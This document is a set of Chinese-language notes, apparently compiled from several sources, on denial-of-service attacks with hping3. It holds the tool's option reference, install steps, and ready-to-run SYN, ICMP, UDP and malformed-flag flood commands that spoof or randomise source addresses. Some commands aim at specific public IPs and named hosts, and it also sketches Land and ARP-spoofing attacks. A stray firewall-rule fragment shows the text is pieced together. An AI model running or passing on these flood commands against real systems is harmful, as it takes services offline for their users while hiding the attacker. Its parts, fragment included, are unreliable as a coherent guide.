# DoS***方法（hping3）

hping3 -i ul -S -p 80 192.168.0.23
hping3 -S -p 80 --flood --rand-source 192.168.0.23
hping3 -i ul -S -p 80 192.168.0.23
hping3 -S -p 21 --flood --rand-source 211.75.237.90
hping3 -c 100 -d 128 -S -w 64 -p 21 --flood --rand-source 211.75.237.90
hping3 -a 211.75.237.89 -1 -p 80 --flood 211.75.237.90


```
root@kali:~# hping3 -h
usage: hping3 host [options]
  -h  --help      show this help
  -v  --version   show version
  -c  --count     packet count
  -i  --interval  wait (uX for X microseconds, for example -i u1000)
      --fast      alias for -i u10000 (10 packets for second)
      --faster    alias for -i u1000 (100 packets for second)
      --flood      sent packets as fast as possible. Don't show replies.
  -n  --numeric   numeric output
  -q  --quiet     quiet
  -I  --interface interface name (otherwise default routing interface)
  -V  --verbose   verbose mode
  -D  --debug     debugging info
  -z  --bind      bind ctrl+z to ttl           (default to dst port)
  -Z  --unbind    unbind ctrl+z
      --beep      beep for every matching packet received
Mode
  default mode     TCP
  -0  --rawip      RAW IP mode
  -1  --icmp       ICMP mode
  -2  --udp        UDP mode
  -8  --scan       SCAN mode.
                   Example: hping --scan 1-30,70-90 -S www.target.host
  -9  --listen     listen mode
IP
  -a  --spoof      spoof source address
  --rand-dest      random destionation address mode. see the man.
  --rand-source    random source address mode. see the man.
  -t  --ttl        ttl (default 64)
  -N  --id         id (default random)
  -W  --winid      use win* id byte ordering
  -r  --rel        relativize id field          (to estimate host traffic)
  -f  --frag       split packets in more frag.  (may pass weak acl)
  -x  --morefrag   set more fragments flag
  -y  --dontfrag   set don't fragment flag
  -g  --fragoff    set the fragment offset
  -m  --mtu        set virtual mtu, implies --frag if packet size > mtu
  -o  --tos        type of service (default 0x00), try --tos help
  -G  --rroute     includes RECORD_ROUTE option and display the route buffer
  --lsrr           loose source routing and record route
  --ssrr           strict source routing and record route
  -H  --ipproto    set the IP protocol field, only in RAW IP mode
ICMP
  -C  --icmptype   icmp type (default echo request)
  -K  --icmpcode   icmp code (default 0)
      --force-icmp send all icmp types (default send only supported types)
      --icmp-gw    set gateway address for ICMP redirect (default 0.0.0.0)
      --icmp-ts    Alias for --icmp --icmptype 13 (ICMP timestamp)
      --icmp-addr  Alias for --icmp --icmptype 17 (ICMP address subnet mask)
      --icmp-help  display help for others icmp options
UDP/TCP
  -s  --baseport   base source port             (default random)
  -p  --destport   [+][+]<port> destination port(default 0) ctrl+z inc/dec
  -k  --keep       keep still source port
  -w  --win        winsize (default 64)
  -O  --tcpoff     set fake tcp data offset     (instead of tcphdrlen / 4)
  -Q  --seqnum     shows only tcp sequence number
  -b  --badcksum   (try to) send packets with a bad IP checksum
                   many systems will fix the IP checksum sending the packet
                   so you'll get bad UDP/TCP checksum instead.
  -M  --setseq     set TCP sequence number
  -L  --setack     set TCP ack
  -F  --fin        set FIN flag
  -S  --syn        set SYN flag
  -R  --rst        set RST flag
  -P  --push       set PUSH flag
  -A  --ack        set ACK flag
  -U  --urg        set URG flag
  -X  --xmas       set X unused flag (0x40)
  -Y  --ymas       set Y unused flag (0x80)
  --tcpexitcode    use last tcp->th_flags as exit code
  --tcp-mss        enable the TCP MSS option with the given value
  --tcp-timestamp  enable the TCP timestamp option to guess the HZ/uptime
Common
  -d  --data       data size                    (default is 0)
  -E  --file       data from file
  -e  --sign       add 'signature'
  -j  --dump       dump packets in hex
  -J  --print      dump printable characters
  -B  --safe       enable 'safe' protocol
  -u  --end        tell you when --file reached EOF and prevent rewind
  -T  --traceroute traceroute mode              (implies --bind and --ttl 1)
  --tr-stop        Exit when receive the first not ICMP in traceroute mode
  --tr-keep-ttl    Keep the source TTL fixed, useful to monitor just one hop
  --tr-no-rtt       Don't calculate/show RTT information in traceroute mode
ARS packet description (new, unstable)
  --apd-send       Send the packet described with APD (see docs/APD.txt)


----------------------------------------------------------------



-h –help 显示帮助信息
-v –version 显示Hping的版本信息
-c –count 指定数据包的次数
-i –interval 指定发包间隔为多少毫秒，如-i m10：表示发包间隔为10毫秒(附:秒、毫秒、微秒进率。1s=1000ms(毫秒)=1000000(微秒)，1s=10^3ms(毫秒)=10^6μs(微秒))
–fast 与-i m100等同，即每秒钟发送10个数据包(hping的间隔u表示微妙，－－fast表示快速模式，一秒10个包。)
-n –numeric 指定以数字形式输出,表示不进行名称解析。
-q –quiet 退出Hping
-I –interface 指定IP，如本机有两块网卡，可通过此参数指定发送数据包的IP地址。如果不指定则默认使用网关IP
-V –verbose 详细模式,一般显示很多包信息。
-D –debug 定义hping使用debug模式。
-z –bind 将ctrl+z 绑定到ttl，默认使用DST端口
-Z –unbind 解除ctrl+z的绑定

指定所用的模式：
(缺省使用TCP进行PING处理)
-0 –rawip 裸IP方式,使用RAWSOCKET方式。
-1 –icmp ICMP 模式
-2 –udp UDP 模式
-8 –scan 扫描模式. (例: hping –scan 1-30,70-90 -S www.target.host)
-9 –listen 监听模式，会接受指定的信息。侦听指定的信息内容。

IP选项：

-a –spoof 源地址欺骗
–rand-dest 随机目的地址模式
–rand-source 随机源目的地址模式
-t –ttl ttl值，默认为64
-N –id 指定id，默认是随机的
-W –winid 使用win*的id 字节顺序,针对不同的操作系统。
-r –rel 相对的id区域
-f –frag 将数据包分片后传输(可以通过薄弱的acl(访问控制列表))
-x –morefrag 设置更多的分片标记
-y –dontfrag 设置不加分片标记
-g –fragoff 设置分片偏移
-m –mtu 设置虚拟MTU, 当数据包>MTU时要使用–frag 进行分片
-o –tos 指定服务类型，默认是0x00,，可以使用–tos help查看帮助
-G –rroute 包含RECORD_ROUTE选项并且显示路由缓存
–lsrr 释放源路记录
–ssrr 严格的源路由记录
-H –ipproto 设置协议范围，仅在RAW IP模式下使用

ICMP选项

-C –icmptype 指定icmp类型（默认类型为回显请求）
-K –icmpcode 指定icmp编码（默认为0）
–force-icmp 发送所有ICMP数据包类型（默认只发送可以支持的类型） –icmp-gw 针对ICMP数据包重定向设定网关地址（默认是0.0.0.0）
–icmp-ts 相当于–icmp –icmptype 13（ICMP时间戳）
–icmp-addr 相当于–icmp –icmptype 17（ICMP地址掩码）
–icmp-help 显示ICMP的其它帮助选项

UDP/TCP选项

-s –baseport 基本源端口（默认是随机的）
-p –destport 目的端口（默认为0），可同时指定多个端口
-k –keep 仍然保持源端口
-w –win 指定数据包大小，默认为64
-O –tcpoff 设置假的TCP数据偏移
-Q –seqnum 仅显示TCP序列号
-b –badcksum 尝试发送不正确IP校验和的数据包(许多系统在发送数据包时使用固定的IP校验和，因此你会得到不正确的UDP/TCP校验和.)
-M –setseq 设置TCP序列号
-L –setack 使用TCP的ACK（访问控制列表）
-F –fin 使用FIN标记set FIN flag
-S –syn 使用SNY标记
-R –rst 使用RST标记
-P –push 使用PUSH标记
-A –ack 使用 ACK 标记
-U –urg 使用URG标记
-X –xmas 使用 X 未用标记 (0x40)
-Y –ymas 使用 Y 未用标记 (0x80)
–tcpexitcode 最后使用 tcp->th_flags 作为退出代码
–tcp-timestamp 启动TCP时间戳选项来猜测运行时间

常规选项

-d –data 数据大小，默认为0
-E –file 从指定文件中读取数据
-e –sign 增加签名
-j –dump 以十六进行形式转存数据包
-J –print 转存可输出的字符
-B –safe 启用安全协议
-u –end 当通过- -file指定的文件结束时停止并显示，防止文件再从头开始
-T –traceroute 路由跟踪模式
–tr-stop 在路由跟踪模式下当收到第一个非ICMP数据包时退出
–tr-keep-ttl 保持源TTL，对监测一个hop有用
–tr-no-rtt 使用路由跟踪模式时不计算或显示RTT信息

ARS数据包描述(新增加的内容，暂时还不稳定)
–apd-send 发送用描述APD的数据包

```


## install
```
yum install -y yum-plugin-priorities
yum install -y hping3

```

## example


### FTP(21 port)
```
hping3  -c 100000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com

1. hping3 = 應用程式二進位代碼的名稱。
2. -c 100000 = 發送的數據包的數量。
3. -d 120 = 發送到目標機器的每個數據包的大小。
4. -S = 只發送SYN數據包。
5. -w 64 = TCP窗口大小。
6. -p 21 = 目的地埠(21是FTP埠)。你在這裡可以使用任何埠。
7. --flood = 儘可能快地發送數據包，不需要考慮顯示入站回復。洪水攻擊模式。
8. --rand-source = 使用隨機性的源頭IP位址。你還可以使用-a或–spoof來隱藏主機名。詳見文章末尾的參考手冊頁。
9. www.hping3testsite.com = 目的地IP位址或目標機器的IP位址。你在這裡還可以使用網站名稱。在本文中解析至127.0.0.1(已在/etc/hosts文件中輸入)。
那麼，你如何知道它切實可行呢?在hping3洪水攻擊模式下，我們並不檢查收到的回覆(實際上你也無法檢查收到的回覆，因為我們在這個命令中使用了–rand-souce標誌，這意味著源頭IP位址不再是你的IP位址。)
```
## 結合偽造IP位址的簡單的SYN洪水攻擊――使用HPING3的DoS

```
hping3 -S -P -U --flood -V --rand-source www.hping3testsite.com
```

```
hping3  192.168.0.21 –i u10000  –S  –a 1.2.3.4
hping3 want_ping_ip --fast -p 80 -S  --rand-source
hping want_ping_ip –i u100000 –S –a 1.2.3.4 
hping3 -q -n -a want_ping_ip -S -s 53 --keep -p 22 --flood want_ping_ip

[ -c count ]  [ -d data size ] [ -s source port ] [ -w tcp window ] [ -p desk port ] [ -a 偽造來源IP ]
-- flood    洪水 盡可能快地發送數據包，而不必注意顯示傳入的回复。
-- rand-source  該選項啟用隨機源模式。 hping將發送具有隨機源地址的數據包。使用此選項強調防火牆狀態表以及TCP / IP堆棧和防火牆軟件內部的其他基於每個IP的動態表是很有趣的。


------------------------------------------------

hping www.abc.net.tw -1 -i u100000 -a 100.100.100.100
每秒送10個(-i u10000)ICMP(-1)封包到www.abc.net.tw 偽造來源IP(-a)為100.100.100.100


hping www.abc.net.tw –i u1000000 –a 100.100.100.100 –s 22222 –p 44444
每秒送1個(-i u1000000)TCP(default)封包到www.abc.net.tw的port 44444，偽造來源IP(-a)100.100.100.100使用的port為22222

hping www.abc.net.tw -1 -i u100000 -a 100.100.100.100 
每秒送10個(-i u10000)ICMP(-1)封包到www.abc.net.tw 偽造來源IP(-a)為100.100.100.100 

hping www.abc.net.tw –i u1000000 –a 100.100.100.100 –s 22222 –p 44444 
每秒送1個(-i u1000000)TCP(default)封包到www.abc.net.tw的port 44444，偽造來源IP(-a)100.100.100.100使用的port為22222 

測試1： SYN Flooding(每秒10個封包) 
hping 目標主機IP –i u100000 –S –a 偽造來源IP 

測試2 ：偽造IP的ICMP封包(每秒10個封包) 
hping 目標主機IP –i u100000 –1 –a 偽造來源IP 
註：-1為數字非英文 

測試3：不正常TCP Flag組合封包(每秒10個封包) 
(a)SYN+FIN 
hping 目標主機IP –i u100000 –S –F –a 偽造來源IP 
(b)X’mas 
hping 目標主機IP –i u100000 –F –S –R –P –A –U –a 偽造來源IP 
測試4：偽造IP的UDP封包 
hping目標主機IP –i u100000 –2 –a 偽造來源IP 

測試5：偽造IP內含CodeRed封包 
hping 目標主機IP –i u100000 –d [封包datasize] –E [filename] –a [偽造來源IP] 


基本參數
hping3 -c 3 192.168.56.81 <== 丟出3個TCP封包，不含Flags，DPort 為 0。這也表示，一定不會有回應
hping3 -c 3 -i 2 192.168.56.81 <== 丟出3個TCP封包，每2秒一個封包。預設為1秒
hping3 -c 20 192.168.56.81 --fast <== 丟出20個TCP封包，fast 等於 u10000，1秒10次
hping3 192.168.56.81 --faster <== faster 等於 u1，1秒1000000次。這個會受到設備上限限制
hping3 192.168.56.81 --flood <== flood 等於 u0。測試系統上限
hping3 -c 3 -n 192.168.56.81 <== 丟出3個TCP封包，不反查
hping3 -c 3 -q 192.168.56.81 <== 丟出3個TCP封包，每次資訊不回應
hping3 -I eth0 -c 3 192.168.56.81 <== 走eth0介面，丟出3個TCP封包。預設使用路由介面

協定選擇參數
hping3 -0 -c 3 192.168.56.81 <== 使用IP 協定，丟出3個封包（也可用 --rawip）
hping3 -1 -c 3 192.168.56.81 <== 使用ICMP 協定，丟出3個封包（也可用 --icmp）
hping3 -2 -c 3 192.168.56.81 <== 使用UDP 協定，丟出3個封包（也可用 --udp）
hping3 -8 '70-80,!82' 192.168.56.81 <== 使用TCP 協定，掃瞄70-80，略過82 port，並產生回應報表。預設掃瞄 8次（也可用 --scan）
hping3 -9 TEST -I eth1 <== 監聽本機由eth1 送來的封包，並過濾封包data 中含有TEST 字元，並列出後面的字

IP 協定相關參數
hping3 -1 -c 3 192.168.56.81 -a 192.168.56.82 <== 使用ICMP 協定，丟出3個封包，並設定來源IP 為192.168.56.82。也可以用--spoof
hping3 -1 -c 3 192.168.56.81 --rand-source <== 使用ICMP 協定，丟出3個封包，並設定來源IP 為隨機
hping3 -I eht1 -1 -c 3 192.168.56.x --rand-dest <== 指定介面為 erh1，使用ICMP 協定，丟出3個封包，並設定去向IP 為隨機
hping3 -I eht1 -1 -c 3 192.168.56.* --rand-dest <== 指定介面為 erh1，使用ICMP 協定，丟出3個封包，並設定去向IP 為192.168.56.0（透過127.0.0.1發送icmp 給192.168.56.1-255）
hping3 -I eht1 -1 -c 3 -t 3 192.168.56.81 <== 指定介面為 erh1，使用ICMP 協定，丟出3個封包，TTL值為3
hping3 -I eht1 -1 -c 3 -N 15 192.168.56.81 <== 指定介面為 erh1，使用ICMP 協定，丟出3個封包，ID（identification值）為15（0x000f）。也可以用--id
hping3 -1 -c 3 -m 8 192.168.56.81 <== 使用ICMP 協定，丟出3個封包，且mtu最大值為8
hping3 -1 -c 3 -o 1 192.168.56.81 <== 使用ICMP 協定，丟出3個封包，TOS 設為 1
hping3 -1 -c 3 -G 192.168.56.81 <== 使用ICMP 協定，丟出3個封包，在IP head 的option 中加入 RECORD_ROUTE資訊

ICMP 協定相關參數
hping3 -1 -c 3 -C 3 192.168.56.81 <== 使用ICMP 協定，丟出3個封包，並將Type 設為 3（Distination Unreachable）
hping3 -1 -c 3 -K 1 192.168.56.81 <== 使用ICMP 協定，丟出3個封包，並將Code 設為 1（Host Unreachable）
hping3 -1 -c 3 --icmp-cksum 121 192.168.56.81 <== 使用ICMP 協定，丟出3個封包，並將Chcksum值改為30，這麼做對方就不會回應了

TCP/UDP 協定相關參數 
hping3 -c 3 -s 70 -p 80 192.168.56.81 <== 使用TCP 協定，來源端由70 埠開始，ping client 端的80 埠 3次（70->80、71->80、72->80） 
hping3 -c 3 -p 80 -w 64 192.168.56.81 <== 使用TCP 協定，ping client 端的80 埠 3次，並修 改緩衝區（windows size）大小為64 bytes 
hping3 -c 3 -p 80 -O 5 192.168.56.81 <== 使用TCP 協定，ping client 端的80 埠3次，並修 改Offset值（Head Lenght）為 20 bytes。預設值為5（20 bytes） 
hping3 -c 3 -p 80 -M 10 192.168.56.81 <== 使用TCP 協定，ping client 端的80 埠3次，並修 改封包序號（Sequence number）為 10。預設值由1開始（20 bytes）。設定後沒反應 
hping3 -c 3 -p 80 -L 1 192.168.56.81 <== 使用TCP 協定，ping client 端的80 埠3次，並修改 Acknowledgment number為 1 
hping3 -c 3 -p 80 -b 192.168.56.81 <== 使用TCP 協定，ping client 端的80 埠3次，使用異 常的Checksum 訊息。Client 會無法回應 
hping3 -c 3 -p 80 -S --tcp-timestamp 192.168.56.81 <== 使用TCP 協定，ping client 端的80 埠3次，使用 SYN，並透過 tcpts值 / hz值取得系統開機時間


一般參數
hping3 -1 -c 3 -d 20 192.168.56.81 <== 使用ICMP 協定，ping client 3次，並在DATA 中加入20bytes 的資料（只看到18bytes 資料）
hping3 -c 3 -p 80 -S -d 20 192.168.56.81 <== 使用TCP 協定，ping client 端的80 埠3 次，並在DATA 中加入20bytes 的資料
hping3 -1 -c 3 -E /home/towns/test.txt -d 32 192.168.56.81 <== 使用ICMP 協定，ping client 3次，並寫入指定檔案內容，在DATA 中加入32 bytes 的資料
hping3 -1 -c 3 -e 'ping me' -d 32 192.168.56.81 <== 使用ICMP 協定，ping client 3次，並在DATA 中寫入ping me文字，於32 bytes 的資料中
hping3 -1 -c 3 -j 192.168.56.81 <== 使用ICMP 協定，ping client 3次，並列出回應的訊息（16進位碼表示，其內容只包含IP以下協定資訊）
hping3 -1 -c 3 -J 192.168.56.81 <== 使用ICMP 協定，ping client 3次，並列出回應的訊息（以，其內容只包含IP以下協定資訊）
hping3 -1 -c 1 -d 40 -e TEST -E /home/towns/test.txt -d 40 192.168.56.99
hping3 - 9 TEST -I eth1
使用90主機ping 99 主機，並帶標頭為TEST，且載入檔案的內容
90 主機設定監聽來自eth1 所有封包
這時99 主機收到封包後，會顯示檔案內容
hping3 -1 -c 1 -d 40 -e TEST -E /home/towns/test.txt -d 40 192.168.56.99 -B ==> 加上 -B（--save），封包將不會被截取


補充1：i 參數後面可以接數字，為秒數，也可以接uX（u為百萬分之一秒），如果1秒要ping 10次，要設為 u10000
補充2：ping 有的參數，hping 都有
補充3：icmp特性，在發生傳送時，會先發出一個arp 封包，確認 LAN 中是否有該IP，如果找不到，就不斷廣播
補充4：8 參數，會列出報表，並參考/etc/services 檔案內容做已知服務回應
補充5：a 參數，會修改IP表頭中的來源IP。但無法修改frame 表頭中的 MAC 資訊
補充6：使用 --rand-dest 時，必需指定介面
補充7：hping 能用於Unix-like系統，如果要使用於windows，只能用於 xp - sp2以下的版本
補充8：f、x、y參數為修改IP 封包標頭的Flag，分別表示為無設定、可分割、不可分割
補充9：mtu，指的是單一訊框（frame）可放大小，1 mtu = 1 btye，mtu 預設值多半為 1500 bytes。mtu 資訊為不含frame head 的大小
補充10：mtu參數，不可與 I 參數合用
補充11：當使用 hping 指令時（使用ICMP），mtu 至少要設為 8，才能正常ping 對方，因為ICMP 封包最小為8 bytes（沒有OPTIONAL DATA）
補充12：RECORD_ROUTE，會在IP head中加入一些路由資訊，多數系統會忽略或丟棄該值
補充13：ICMP Type欄位有0~18 （不含2、6、7、10），一般ping 會成對出現兩個， 8（Echo Request）及0（Echo Reply）
補 充14：--icmp-ipver、--icmp-iphlen、--icmp-iplen、--icmp-ipid、--icmp-ipproto，依 man中的說明分別為 修改IP表頭中的 Version、Header lenght、Lenght、Identifier、Protocol並寫入ICMP 的Optional Data中，但設定後沒反應？！
補充15：TCP 預設表頭長度為20 bytes，用 O 參數會改變長度（當設1時，會出現4 bytes，2 會出現 8bytes）
補充16：TCP-Timestamp值，是TCP計時器的值，是options中的第8種資料，分為Timestamp Value（TSval）及Timestamp Echo Reply（TSecr）兩個值。而hping3 會在第二次ping回應算出 HZ值，透過TSval 值 / HZ值，算出該系統的在線時間為多久，要看到system uptime至少要ping 2次。windows server 預設開啟回應
補充17：F、S、R、P、A、U、X、Y 參數為Flag 修改參數
補充18：X => ECN（Explicit Congestion Notificavion），顯示擁塞通知
補充19：Y => CWR（Congestion Windows Reduced），擁塞窗口減少
補充20：e 參數，會將 d 參數所產生填充資料的第1 byte 的值改掉。當使用1位時，會改第1 byte，當2位時，會改變1、2 byte。可接受數字及字母，但其變更原則不清楚
補充20：使用 j 參數，會列出訊息，可是只有前5 bytes 的訊息與wireshark 相同
補充21：當使用 9 參數做本地監聽時，需有另一台使用e 或E 參數配合
補充22：9 參數是一種嗅探器，當9 後面接TEST ，他會將TEST 後面的資訊列出，當接PASS 時，在沒有加密的FTP 則直接秀出密碼
補充23：j 與 J 參數，則可以探測系統回應的訊息
補充24：使用B（--save）參數後，監聽方會收不到封包（wireshark也收不到哦！）
```




## centos 
```
yum install -y yum-plugin-priorities
yum install -y http://ftp-srv2.kddilabs.jp/Linux/distributions/fedora/epel/6/x86_64/epel-release-6-8.noarch.rpm
yum install -y hping3
```


## DoS***方法（hping3）
实验

1、DOS with random source IP

root@kali:~# hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com

参数含义：:
hping= 应用名称.
-c 100000 =packets 发送的数量.
-d 120 = packet的大小.
-S = 只发送SYN packets.
-w 64 = TCP window的大小.
-p 21 = Destination port (21 being FTP port). 可以使用任意端口.
--flood = Sending packets as fast as possible, 不显示回应. Flood mode.
--rand-source = 使用随机的Source IP Addresses. 或者使用 -a or spoof to hide hostnames.
www.hping3testsite.com = Destination IP address or target machines IP address. 或者使用 一个网址 In my case resolves to 127.0.0.1 (as entered in /etc/hosts file)



2、ICMP flood
ICMP的泛洪***是在最小时间内发送最大的ICMP数据到目标机，例如使用ping指令。在"旧"时代它使用一个巨大的ping（死亡之ping）是可能破坏机器，希望这些时间已经过去，但它仍有可能***任何机器的带宽和处理时间，如果接受到这种ICMP数据包。
ICMP flood using hping 3 :
hping3 -q -n -a 10.0.0.1 --id 0 --icmp -d 56 --flood 192.168.0.2

-q 表示quiet, -n 表示无 name resolving, id 0 表示有ICMP echo request (ping)
-d i表示包的大小 (56 is the normal size for a ping).
某些系统配置中自动地丢弃这种通过hping生成的头部设定不正确的ICMP包（例如不可能设置带顺序的ID）。在这种情况下，您可以使用Wireshark嗅探正常的ICMP回显请求报文，将其保存为二进制文件，并使用hping3重播。

Example:
hping3 -q -n --rawip -a 10.0.0.1 --ipproto 1 --file "./icmp_echo_request.bin" -d 64 --flood 192.168.0.2




3、UDP flood
这是相同的概念ICMP泛洪除非你发送大量的UDP数据。 UDP泛洪对网络带宽非常危险的。
Generating UDP flood:
hping3 -q -n -a 10.0.0.1 --udp -s 53 --keep -p 68 --flood 192.168.0.2
对于UDP，你必须精确的知道源和目的端口，这里我选择了DNS和BOOTPC（的dhclient）端口。该BOOTPC（68）端口经常在个人电脑开着，因为大多数人使用DHCP来自己连接到网络。
ame blacklist_180 --set -m comment --comment"Blacklist source IP" -j DROP





4、SYN flood
SYN泛洪是最常用的扫描技术，以及这样做的原因是因为它是最危险的。 SYN泛洪在于发送大量的TCP数据包只有SYN标志。因为SYN报文用来打开一个TCP连接，受害人的主机将尝试打开这些连接。这些连接，存储的连接表中，将继续开放一定的时间，而***者不断涌入与SYN数据包。一旦受害者的连接表被填满时，它不会接受任何新的连接，因此，如果它是一个服务器这意味着它已不再被任何人访问。
Example of a SYN flood attack :
hping3 -q -n -a 10.0.0.1 -S -s 53 --keep -p 22 --flood 192.168.0.2

5、Other TCP flood attacks
有许多使用TCP泛洪的可能性。如你所愿刚才设置的各种TCP标志。某些TCP泛洪技术包括制定了很多不寻常的标志扰乱。例如与SARFU扫描
Example with the SARFU scan :
hping3 -q -n -a 10.0.0.1 -SARFU -p 22 --flood 192.168.0.2


6、Land***
Land***原理是：用一个特别打造的SYN包，它的原地址和目标地址都被设置成某一个服务器地址。此举将导致接受服务器向它自己的地址发送SYN-ACK消息，结果这个地址又发回ACK消息并创建一个空连接。被***的服务器每接收一个这样的连接都将保留，直到超时，对Land***反应不同，许多UNIX实现将崩溃，NT变的极其缓慢(大约持续5分钟)

7、nmap扫描 确定开放端口
Network Mapper，是Linux下的一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统
verify and test that your firewall filters and rules are performing as intended

nmap v sA n www.yourorg.com oA firewallaudit



8、ARP***/ARP欺骗
工具： ettercap